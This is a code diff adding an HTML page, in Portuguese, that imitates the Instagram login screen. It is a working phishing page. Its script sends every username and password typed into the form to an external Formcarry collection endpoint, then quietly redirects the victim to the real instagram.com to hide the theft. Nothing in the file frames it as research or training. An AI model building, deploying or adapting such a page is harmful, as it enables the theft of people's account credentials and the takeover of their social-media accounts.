@@ -1,0 +1,214 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #0095f6;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-button:hover {
+            background-color: #007bb5;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .separator {
+            margin: 20px 0;
+            position: relative;
+            text-align: center;
+            color: #8e8e8e;
+        }
+        .separator::before, .separator::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            border-top: 1px solid #8e8e8e;
+        }
+        .separator::before {
+            left: 0;
+        }
+        .separator::after {
+            right: 0;
+        }
+        .separator span {
+            background-color: white;
+            padding: 0 10px;
+        }
+        .signup-link {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        /* Estilo para os ícones no canto superior direito */
+        .top-icons {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            gap: 15px;
+        }
+        .top-icons i {
+            font-size: 20px;
+            color: #333;
+            cursor: pointer;
+        }
+        .top-icons i:hover {
+            color: #0095f6;
+        }
+        /* Estilo para o logo e o texto no canto superior esquerdo */
+        .top-left {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+        }
+        .top-left img {
+            width: 25px;
+            margin-right: 10px;
+        }
+        .top-left span {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Logo e nome do Instagram no canto superior esquerdo -->
+    <div class="top-left">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/800px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+        <span>Instagram</span>
+    </div>
+
+    <!-- Ícones no canto superior direito -->
+    <div class="top-icons">
+        <i class="fas fa-search"></i> <!-- Lupa -->
+        <i class="fas fa-comment-dots"></i> <!-- Chat -->
+        <i class="fas fa-heart"></i> <!-- Likes -->
+    </div>
+
+    <div class="login-container">
+        <!-- Logo do Instagram centralizado -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/800px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+
+        <!-- Formulário de login configurado para enviar dados para Formcarry -->
+        <form id="loginForm" action=https://formcarry.com/s/-RXHq3vAcpGmethod="POST" onsubmit="return handleFormSubmit(event)">
+            <input class="input-field" type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" autocomplete="off" required>
+            <input class="input-field" type="password" name="password" placeholder="Senha" autocomplete="off" required>
+            <button type="submit" class="login-button">Entrar</button>
+        </form>
+
+        <!-- Link para esquecer a senha -->
+        <a href="#" class="forgot-password">Esqueceu a senha?</a>
+
+        <!-- Separador -->
+        <div class="separator">
+            <div></div>
+            <span>OU</span>
+            <div></div>
+        </div>
+
+        <!-- Link para criar uma conta -->
+        <p class="signup-link">Não tem uma conta? <a href="#">Cadastre-se</a></p>
+    </div>
+
+    <script>
+        // Função para enviar o formulário e redirecionar para o Instagram
+        function handleFormSubmit(event) {
+            event.preventDefault(); // Impede o envio tradicional do formulário
+
+            const form = event.target;
+
+            // Cria um objeto FormData para enviar os dados do formulário
+            const formData = new FormData(form);
+
+            // Envia os dados para o Formcarry
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Dados enviados com sucesso!");
+                    // Espera 3 segundos para garantir que os dados foram enviados
+                    setTimeout(function() {
+                        // Redireciona para o Instagram após os dados serem enviados
+                        window.location.href = 'https://www.instagram.com';
+                    }, 3000); // Espera 3 segundos após o envio
+                } else {
+                    console.error("Erro ao enviar dados.");
+                    alert("Erro ao enviar dados. Tente novamente.");
+                }
+            })
+            .catch(error => {
+                console.error("Erro de conexão:", error);
+                alert("Erro de conexão. Tente novamente.");
+            });
+
+            return false; // Impede o envio tradicional do formulário
+        }
+    </script>
+
+</body>
+</html>
